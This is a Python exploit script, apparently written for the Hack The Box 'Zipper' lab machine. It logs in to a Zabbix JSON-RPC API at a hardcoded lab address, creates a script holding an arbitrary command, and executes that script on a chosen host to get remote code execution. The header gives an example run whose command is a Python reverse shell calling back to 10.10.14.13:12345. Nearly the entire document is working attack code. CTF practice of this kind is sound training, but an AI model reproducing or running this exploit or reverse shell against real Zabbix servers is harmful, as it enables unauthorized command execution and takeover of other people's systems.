#!/usr/bin/python3
"""
Title: zabbix_rpc_rce.py
Date: 20181023
Author: epi <epibar052@gmail.com>
  https://epi052.gitlab.io/notes-to-self/
Tested on:
    linux/i686 4.15.0-33-generic #36-Ubuntu SMP Wed Aug 15 13:44:35 UTC 2018
    Python 3.6.6
    requests 2.18.4
Example run on HTB's Zipper:
    ./zabbix_rpc_rce.py --username zapper --password zapper --command 'python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.13\",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"'
"""
import json
import uuid
import argparse

from typing import Union

import requests


def make_rpc_call(method: str, params: dict, auth: Union[str, None]) -> dict:
    """ Make RPC call to URL for RCE.

    Args:
        method: zabbix RPC method
        params: dictionary of parameters to send
        auth: zabbix authentication token

    Returns:
        JSON response as dictionary
    """
    url = "http://10.10.10.108/zabbix/api_jsonrpc.php"

    payload = {
        "jsonrpc": "2.0",
        "method": method,
        "params": params,
        "auth": auth,
        "id": 0
    }

    headers = {
        'content-type': 'application/json'
    }

    response = requests.post(url, data=json.dumps(payload), headers=headers)

    return response.json()


def authenticate(user: str, passwd: str) -> str:
    """ Authenticate to Zabbix SERVER with user:passwd credentials.

    API Documentation
        https://www.zabbix.com/documentation/3.0/manual/api/reference/user/login

        Request
        {
            "jsonrpc": "2.0",
            "method": "user.login",
            "params": {
                "user": "Admin",
                "password": "zabbix"
            },
            "id": 1
        }

        Response
        {
            "jsonrpc": "2.0",
            "result": "0424bd59b807674191e7d77572075f33",
            "id": 1
        }

    Args:
        user: Zabbix user
        passwd: User's password

    Returns:
        Zabbix authentication token
    """
    auth_call = make_rpc_call(method='user.login', params=dict(user=user, password=passwd), auth=None)
    return auth_call.get('result')


def get_hostid_by_host(host: str, token: str) -> str:
    """ Get a Zabbix Hosts's hostid attribute via the Hosts's name attribute

    API Documentation
        https://www.zabbix.com/documentation/2.2/manual/api/reference/host/get

        REQUEST
        {
            "jsonrpc": "2.0",
            "method": "host.get",
            "params": {
                "filter": {
                    "host": [
                        "Zabbix server",
                        "Linux server"
                    ]
                }
            },
            "auth": "038e1d7b1735c6a5436ee9eae095879e",
            "id": 1
        }

        RESPONSE
        {
            "jsonrpc": "2.0",
            "result": [
                {
                    "maintenances": [],
                    "hostid": "10160",
                    "proxy_hostid": "0",
                    "host": "Zabbix server",
                    "status": "0",
                    "disable_until": "0",
            ------------- 8< -------------

    Args:
        host: Zabbix host name
        token: Zabbix authentication token

    Returns:
        Zabbix Host hostid attribute
    """
    hostid_call = make_rpc_call(method='host.get', params=dict(output=['host']), auth=token)

    for result in hostid_call.get('result'):
        if result.get('host') == host:
            return result.get('hostid')


def execute_command(cmd: str, token: str, location: int) -> None:
    """ Execute command on target by creating/executing a script.

    API Documentation
        https://www.zabbix.com/documentation/3.0/manual/api/reference/script/create
        https://www.zabbix.com/documentation/3.0/manual/api/reference/script/execute

        script/create REQUEST
        {
            "jsonrpc": "2.0",
            "method": "script.create",
            "params": {
                "name": "Reboot server",
                "command": "reboot server 1",
                "host_access": 3,
                "confirmation": "Are you sure you would like to reboot the server?"
            },
            "auth": "038e1d7b1735c6a5436ee9eae095879e",
            "id": 1
        }

        script/create RESPONSE
        {
            "jsonrpc": "2.0",
            "result": {
                "scriptids": [
                    "3"
                ]
            },
            "id": 1
        }
        ---------------------------------------------------------------------
        script/execute REQUEST
        {
            "jsonrpc": "2.0",
            "method": "script.execute",
            "params": {
                "scriptid": "1",
                "hostid": "30079"
            },
            "auth": "038e1d7b1735c6a5436ee9eae095879e",
            "id": 1
        }

        script/execute RESPONSE
        {
            "jsonrpc": "2.0",
            "result": {
                "response": "success",
                "value": "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_req=1 ... "
            },
            "id": 1
        }

    Args:
        cmd: Command to execute on server
        token: Zabbix authentication token
        location: Correlates to the Script.execute_on attribute, determines Server vs. Agent script execution location
            https://www.zabbix.com/documentation/3.0/manual/api/reference/script/object -> execute_on attribute
    """
    script_name = str(uuid.uuid4())[:8]

    create_script_call = make_rpc_call('script.create', params=dict(command=cmd, name=script_name, execute_on=location), auth=token)

    script_id = create_script_call.get('result').get('scriptids')[0]

    rpc_call = make_rpc_call(method='script.execute', params=dict(scriptid=script_id, hostid=hostid), auth=auth_token)

    try:
        print(rpc_call.get('result').get('value'))
    except AttributeError:
        # rpc_call was likely a callback and no results returned
        pass

if __name__ == '__main__':
    hosts = ['Zipper', 'Zabbix']

    parser = argparse.ArgumentParser()

    parser.add_argument('--username', help='username to authenticate with', required=True)
    parser.add_argument('--password', help='password to authenticate with', required=True)
    parser.add_argument('--command', help='command to run on target', required=True)
    parser.add_argument('--zbx_host', help='Zabbix Host to run command on (default: Zipper)', default='Zipper', choices=hosts)

    args = parser.parse_args()

    location = hosts.index(args.zbx_host)

    auth_token = authenticate(user=args.username, passwd=args.password)

    hostid = get_hostid_by_host(host=args.zbx_host, token=auth_token)

    execute_command(cmd=args.command, token=auth_token, location=location)

